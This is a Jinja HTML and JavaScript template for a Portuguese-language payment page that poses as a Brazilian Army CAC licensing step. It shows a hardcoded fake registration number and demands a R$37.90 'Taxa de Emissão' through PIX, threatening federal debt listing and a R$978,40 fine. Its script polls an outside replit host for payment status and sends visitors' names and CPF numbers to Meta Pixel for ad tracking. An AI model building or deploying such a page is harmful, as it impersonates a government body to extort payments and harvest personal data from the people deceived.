{% extends "layout.html" %}

{% block content %}
<style>
body {
    background-color: #fff !important;
}

/* Spinner customizado que vai funcionar */
@keyframes spinRotate {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* Reset qualquer interferência */
.animate-spin {
    animation: spinRotate 1s linear infinite !important;
}

/* Garantir visibilidade dos textos */
#user-name, #user-cpf, #cr-number {
    color: #6b7280 !important;
}
</style>
<main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
        <!-- Formulário CAC -->
        <div class="mb-6" style="text-align: left;">

                <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                    <label class="text-base" style="font-weight: 600; color: #374151;">REQUERENTE:</label>
                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #6b7280 !important;" id="user-name">Carregando...</p>
                </div>
                
                <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                    <label class="text-base" style="font-weight: 600; color: #374151;">CPF:</label>
                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #6b7280 !important;" id="user-cpf">Carregando...</p>
                </div>
                
                <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                    <label class="text-base" style="font-weight: 600; color: #374151;">Nº CR:</label>
                    <p class="text-base" style="margin: 4px 0; color: #6b7280 !important; font-weight: 500;" id="cr-number">000.000.000-00</p>
                </div>
                
                
                <div style="background-color: #fef7ed; padding: 12px; border-radius: 2px;">
                    <label class="text-base" style="font-weight: 600; color: #B8860B;">PENDÊNCIA:</label>
                    <p class="text-base" style="margin: 4px 0; color: #B8860B;">A cobrança da Taxa de Emissão foi emitida em seu CPF <span id="pendencia-cpf" style="font-weight: bold;"></span>. O pagamento é obrigatório pois o processo de abertura do CAC foi aberto dentro do sistema do Exército Brasileiro.</p>
                    <br>
                    <div class="text-base" style="margin: 4px 0; color: #B8860B; font-weight: bold;">
                        IMPORTANTE: O não pagamento da Taxa de Emissão resultará em:
                        <br><br>
                        • Inscrição em dívida ativa da União<br>
                        • Aplicação de multa administrativa de R$978,40 em seu CPF pelo Exército Brasileiro
                    </div>
                </div>
            </div>
        </div>
    <!-- Spinner de status -->
    <div style="text-align: center; margin-bottom: 16px; padding: 10px;">
        <div style="width: 30px; height: 30px; border: 3px solid #f3f4f6; border-top: 3px solid #DC9D33; border-radius: 50%; display: inline-block; animation: spinRotate 1s linear infinite; margin-bottom: 8px;"></div>
        <p style="color: #DC9D33; font-weight: 600; font-size: 16px; margin: 0;">Aguardando Pagamento</p>
    </div>

        <!-- Status (oculto por padrão) -->
        <div id="payment-status" class="mb-6 hidden">
            <div id="loading-payment" class="text-center">
                <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-green-600 mb-2"></div>
                <p class="text-gray-600">Processando pagamento...</p>
            </div>
        </div>

        <!-- QR Code PIX -->
        <div id="payment-details" class="hidden">
            <!-- Taxa de Emissão acima do QR Code -->
            <div class="text-center mb-2">
                <p class="text-sm" style="color: #6b7280; font-weight: normal;">TAXA DE EMISSÃO: R$ 37,90</p>
            </div>
            
            <div class="text-center mb-6">
                <div id="qr-code-container" class="mb-4 flex justify-center items-center">
                    <img id="qr-code" src="" alt="QR Code PIX" class="border-2 border-gray-300 rounded bg-white p-2" style="width: 180px; height: 180px;">
                </div>
                <p id="qr-status" class="text-base text-gray-600 mb-4">Gerando QR Code...</p>
            </div>

            <!-- Código PIX -->
            <div style="margin-bottom: 24px;">
                <label class="text-base" style="display: block; font-weight: 500; color: #374151; margin-bottom: 8px;">Código PIX (Copia e Cola):</label>
                <textarea id="pix-code" readonly rows="1"
                       class="text-base" style="width: 100%; padding: 8px; border: 1px solid #d1d5db; border-radius: 2px; background-color: #f9fafb; resize: none; font-family: monospace; height: 40px; overflow: hidden;" 
                       placeholder="Código será gerado..."></textarea>
                <div style="text-align: center; margin-top: 12px;">
                    <button onclick="copyPixCode()" 
                            class="text-lg" style="background: linear-gradient(145deg, #059669, #047857); color: white; padding: 20px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; transition: all 0.3s; box-shadow: 0 8px 16px rgba(5,150,105,0.3), 0 4px 8px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.2); transform: translateY(-2px); font-size: 18px; width: 100%;"
                            onmouseover="this.style.background='linear-gradient(145deg, #047857, #065f46)'; this.style.boxShadow='0 12px 24px rgba(5,150,105,0.4), 0 6px 12px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.3)'; this.style.transform='translateY(-3px)';" 
                            onmouseout="this.style.background='linear-gradient(145deg, #059669, #047857)'; this.style.boxShadow='0 8px 16px rgba(5,150,105,0.3), 0 4px 8px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.2)'; this.style.transform='translateY(-2px)';">
                        <i class="fas fa-copy" style="margin-right: 10px;"></i>
                        Copiar Código PIX
                    </button>
                </div>
            </div>

            <!-- Instruções -->
            <div style="background-color: #F3F4F6; padding: 16px; margin-bottom: 16px; border-radius: 2px;">
                <div style="display: flex; align-items: flex-start;">
                    <div style="flex-shrink: 0; margin-right: 12px; margin-top: 2px;">
                        <i class="fas fa-info-circle text-base" style="color: #059669;"></i>
                    </div>
                    <div>
                        <p class="text-base" style="color: #059669; margin: 0;">
                            <strong>Como pagar:</strong><br>
                            1. Clique no botão acima para copiar<br>
                            2. Abra o aplicativo do seu banco<br>
                            3. Selecione PIX > PIX copia e cola<br>
                            4. Cole o código copiado e efetue o pagamento<br>
                        </p>
                    </div>
                </div>
            </div>

            <!-- Status do Pagamento -->
            <div id="payment-check" class="text-center">
                <button onclick="checkPaymentStatus()" 
                        class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">
                    <i class="fas fa-sync-alt mr-2"></i>
                    Verificar Pagamento
                </button>
            </div>
        </div>

        <!-- Erro -->
        <div id="payment-error" class="hidden">
            <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-4">
                <div class="flex">
                    <div class="flex-shrink-0">
                        <i class="fas fa-exclamation-triangle text-red-400"></i>
                    </div>
                    <div class="ml-3">
                        <p class="text-base text-red-700" id="error-message">Erro ao processar pagamento</p>
                    </div>
                </div>
            </div>
            <div class="text-center">
                <button onclick="retryPayment()" 
                        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
                    Tentar Novamente
                </button>
            </div>
        </div>
    </div>
</main>

<script>
let currentTransactionId = null;

// Função para hash SHA256 (para dados sensíveis)
async function hashData(data) {
    if (!data) return null;
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(data.toLowerCase().trim());
    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Função para obter parâmetros UTM da URL
function getUTMParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const utmParams = {};
    
    // Parâmetros UTM padrão
    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'].forEach(param => {
        const value = urlParams.get(param) || localStorage.getItem(param);
        if (value) {
            utmParams[param] = value;
            localStorage.setItem(param, value); // Persistir para outras páginas
        }
    });
    
    // Parâmetros específicos da Meta
    ['fbclid', 'fbc', 'fbp'].forEach(param => {
        const value = urlParams.get(param) || localStorage.getItem(param);
        if (value) {
            utmParams[param] = value;
            localStorage.setItem(param, value);
        }
    });
    
    return utmParams;
}

// Função para processar pagamento ao carregar a página
document.addEventListener('DOMContentLoaded', function() {
    // Capturar e armazenar parâmetros UTM
    getUTMParams();
    initializePayment();
});

function initializePayment() {
    // Preencher número CR fixo
    document.getElementById('cr-number').textContent = '678923/2025 - 2ª RM';

    // Buscar dados do usuário da sessão e processar pagamento
    fetch('/get_user_data')
        .then(response => response.json())
        .then(data => {
            console.log('Dados do usuário da API:', data);
            document.getElementById('user-name').textContent = (data.full_name || 'USUÁRIO NÃO IDENTIFICADO').toUpperCase();
            document.getElementById('user-cpf').textContent = (data.cpf || '000.000.000-00').toUpperCase();
            
            // Atualizar CPF na mensagem de pendência
            document.getElementById('pendencia-cpf').textContent = (data.cpf || '000.000.000-00').toUpperCase();
            
            // Verificar se há dados no localStorage também
            const localData = {
                nome: localStorage.getItem('full_name') || localStorage.getItem('nome') || '',
                cpf: localStorage.getItem('cpf') || '',
                telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || ''
            };
            
            console.log('Dados do localStorage:', localData);
            
            // Usar dados da sessão ou localStorage (priorizar sessão)
            const userData = {
                nome: data.full_name || localData.nome || 'Usuário Teste',
                cpf: data.cpf || localData.cpf || '000.000.000-00',
                telefone: data.phone || localData.telefone || '11999999999'
            };
            
            console.log('Dados finais para pagamento:', userData);
            
            // Processar pagamento com dados reais
            return fetch('/process_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userData)
            });
        })
        .catch(error => {
            console.error('Erro ao buscar dados do usuário:', error);
            document.getElementById('user-name').textContent = 'USUÁRIO NÃO IDENTIFICADO';
            document.getElementById('user-cpf').textContent = '000.000.000-00';
            
            // Atualizar CPF na mensagem de pendência também no fallback
            document.getElementById('pendencia-cpf').textContent = '000.000.000-00';
            
            // Em caso de erro, tentar com dados do localStorage
            const fallbackData = {
                nome: localStorage.getItem('full_name') || localStorage.getItem('nome') || 'Usuário Teste',
                cpf: localStorage.getItem('cpf') || '000.000.000-00',
                telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || '11999999999'
            };
            
            return fetch('/process_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(fallbackData)
            });
        })
        .then(response => response.json())
    .then(data => {
        console.log('Resposta do pagamento:', data);
        
        if (data.success) {
            showPaymentDetails(data.payment_data);
        } else {
            showError(data.error || 'Erro ao processar pagamento');
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        showError('Erro de conexão. Tente novamente.');
    });
}

function showPaymentDetails(paymentData) {
    // Esconder apenas o spinner secundário, não afetar o principal
    const paymentStatus = document.getElementById('payment-status');
    if (paymentStatus) {
        paymentStatus.classList.add('hidden');
    }
    document.getElementById('payment-details').classList.remove('hidden');
    
    console.log('PaymentData recebido:', paymentData);
    
    // Configurar QR Code
    const qrCodeElement = document.getElementById('qr-code');
    const qrStatusElement = document.getElementById('qr-status');
    
    if (paymentData.qr_code && paymentData.qr_code.trim() !== '') {
        qrCodeElement.src = 'data:image/png;base64,' + paymentData.qr_code;
        qrStatusElement.textContent = 'Após o pagamento você será redirecionado para o agendamento do exame de tiro.';
        qrCodeElement.style.display = 'block';
    } else {
        // Gerar QR Code usando o código PIX se não tiver imagem
        if (paymentData.pix_code) {
            generateQRCode(paymentData.pix_code);
        } else {
            qrStatusElement.textContent = 'QR Code não disponível';
            qrCodeElement.style.display = 'none';
        }
    }
    
    // Configurar código PIX
    if (paymentData.pix_code) {
        document.getElementById('pix-code').value = paymentData.pix_code;
        document.getElementById('pix-code').style.height = 'auto';
    }
    
    // Armazenar ID da transação
    currentTransactionId = paymentData.transaction_id;
    
    // Iniciar verificação automática de status
    startAutomaticStatusCheck(paymentData.transaction_id);
}

function generateQRCode(pixCode) {
    // Usar uma API de QR Code gratuita
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixCode)}`;
    const qrCodeElement = document.getElementById('qr-code');
    const qrStatusElement = document.getElementById('qr-status');
    
    qrCodeElement.src = qrUrl;
    qrCodeElement.style.display = 'block';
    qrStatusElement.textContent = 'Após o pagamento você será redirecionado para o agendamento do exame de tiro.';
}

function showError(message) {
    // Esconder apenas o spinner secundário, não afetar o principal
    const paymentStatus = document.getElementById('payment-status');
    if (paymentStatus) {
        paymentStatus.classList.add('hidden');
    }
    document.getElementById('payment-error').classList.remove('hidden');
    document.getElementById('error-message').textContent = message;
}

function copyPixCode() {
    const pixCodeTextarea = document.getElementById('pix-code');
    pixCodeTextarea.select();
    pixCodeTextarea.setSelectionRange(0, 99999); // Para dispositivos móveis
    
    try {
        document.execCommand('copy');
        // Feedback visual
        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
        button.classList.add('bg-green-800');
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.classList.remove('bg-green-800');
        }, 2000);
    } catch (err) {
        console.error('Erro ao copiar código PIX:', err);
        // Fallback para navegadores modernos
        navigator.clipboard.writeText(pixCodeTextarea.value).then(() => {
            const button = event.target.closest('button');
            const originalText = button.innerHTML;
            button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
            button.classList.add('bg-green-800');
            
            setTimeout(() => {
                button.innerHTML = originalText;
                button.classList.remove('bg-green-800');
            }, 2000);
        });
    }
}

function checkPaymentStatus() {
    if (!currentTransactionId) {
        alert('ID da transação não encontrado');
        return;
    }
    
    const button = event.target;
    const originalText = button.innerHTML;
    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
    button.disabled = true;
    
    fetch(`/check_payment_status/${currentTransactionId}`)
    .then(response => response.json())
    .then(data => {
        console.log('Status do pagamento:', data);
        
        if (data.success && data.status === 'PAID') {
            // Pagamento aprovado, redirecionar
            window.location.href = '/aprovado';
        } else {
            alert('Pagamento ainda pendente. Verifique novamente em alguns instantes.');
        }
    })
    .catch(error => {
        console.error('Erro ao verificar status:', error);
        alert('Erro ao verificar status do pagamento');
    })
    .finally(() => {
        button.innerHTML = originalText;
        button.disabled = false;
    });
}

function startAutomaticStatusCheck(transactionId) {
    console.log('Iniciando verificação automática de status para transação:', transactionId);
    
    const statusInterval = setInterval(() => {
        fetch(`https://recoveryfy.replit.app/api/order/${transactionId}/status`)
            .then(response => response.json())
            .then(data => {
                console.log('Status da transação:', data);
                
                if (data.status === 'approved') {
                    console.log('Pagamento aprovado! Redirecionando para /taxa');
                    clearInterval(statusInterval);
                    
                    // Enviar evento de purchase avançado para Meta Pixel
                    if (typeof fbq !== 'undefined') {
                        sendAdvancedPurchaseEvent();
                    }
                    
                    // Mostrar feedback visual antes de redirecionar
                    const qrStatusElement = document.getElementById('qr-status');
                    if (qrStatusElement) {
                        qrStatusElement.innerHTML = '<span style="color: #059669; font-weight: bold;">✓ Pagamento Aprovado! Redirecionando...</span>';
                    }
                    
                    // Redirecionar após 1 segundo para dar tempo do usuário ver a confirmação
                    setTimeout(() => {
                        window.location.href = '/taxa';
                    }, 1000);
                }
            })
            .catch(error => {
                console.error('Erro ao verificar status da transação:', error);
                // Continuar tentando mesmo com erro
            });
    }, 1000); // Verificar a cada 1 segundo
    
    // Parar verificação após 10 minutos para evitar loop infinito
    setTimeout(() => {
        clearInterval(statusInterval);
        console.log('Verificação automática de status encerrada após 10 minutos');
    }, 600000);
}

// Função para enviar evento de purchase avançado com todos os dados
async function sendAdvancedPurchaseEvent() {
    try {
        // Obter dados do usuário
        const userData = {
            nome: document.getElementById('user-name').textContent || localStorage.getItem('full_name') || '',
            cpf: document.getElementById('user-cpf').textContent || localStorage.getItem('cpf') || '',
            telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || ''
        };
        
        // Obter parâmetros UTM
        const utmParams = getUTMParams();
        
        // Preparar dados para o evento
        const eventData = {
            value: 37.90,
            currency: 'BRL',
            content_type: 'product',
            content_name: 'Taxa de Emissão CAC',
            content_ids: ['cac-taxa-emissao'],
            num_items: 1,
            transaction_id: currentTransactionId || 'cac-' + Date.now(),
            // Adicionar dados UTM como custom parameters
            utm_source: utmParams.utm_source || '',
            utm_medium: utmParams.utm_medium || '',
            utm_campaign: utmParams.utm_campaign || '',
            utm_content: utmParams.utm_content || '',
            utm_term: utmParams.utm_term || ''
        };
        
        // Hash dados sensíveis se disponíveis
        if (userData.nome && userData.nome !== 'USUÁRIO NÃO IDENTIFICADO') {
            // Extrair email se existir (assumindo formato nome + @domain)
            const emailGuess = userData.nome.toLowerCase().replace(/\s+/g, '') + '@email.com';
            eventData.em = await hashData(emailGuess);
        }
        
        if (userData.telefone) {
            // Limpar telefone para hash
            const cleanPhone = userData.telefone.replace(/[^\d]/g, '');
            if (cleanPhone.length >= 10) {
                eventData.ph = await hashData('+55' + cleanPhone);
            }
        }
        
        // Adicionar parâmetros específicos da Meta se disponíveis
        if (utmParams.fbc) {
            eventData.fbc = utmParams.fbc;
        }
        if (utmParams.fbp) {
            eventData.fbp = utmParams.fbp;
        }
        
        // MUDAR Purchase para AddToCart para evitar duplicação
        // O evento Purchase final será enviado apenas na página /aprovado
        fbq('track', 'AddToCart', eventData);
        
        // Enviar também como evento customizado para garantir
        fbq('trackCustom', 'CAC_Payment_Completed', {
            value: 37.90,
            currency: 'BRL',
            transaction_id: currentTransactionId,
            product: 'Taxa de Emissão CAC',
            user_name: userData.nome,
            user_cpf: userData.cpf,
            utm_data: utmParams
        });
        
        console.log('Evento AddToCart enviado para Meta Pixel (evitando duplicação):', eventData);
        
    } catch (error) {
        console.error('Erro ao enviar evento avançado para Meta:', error);
        
        // Fallback para evento básico (mudado para AddToCart)
        fbq('track', 'AddToCart', {
            value: 37.90,
            currency: 'BRL',
            content_type: 'product',
            content_name: 'Taxa de Emissão CAC',
            content_ids: ['cac-taxa-emissao']
        });
    }
}

function retryPayment() {
    document.getElementById('payment-error').classList.add('hidden');
    // Mostrar apenas o spinner secundário se necessário
    const paymentStatus = document.getElementById('payment-status');
    if (paymentStatus) {
        paymentStatus.classList.remove('hidden');
    }
    initializePayment();
}
</script>

{% endblock %}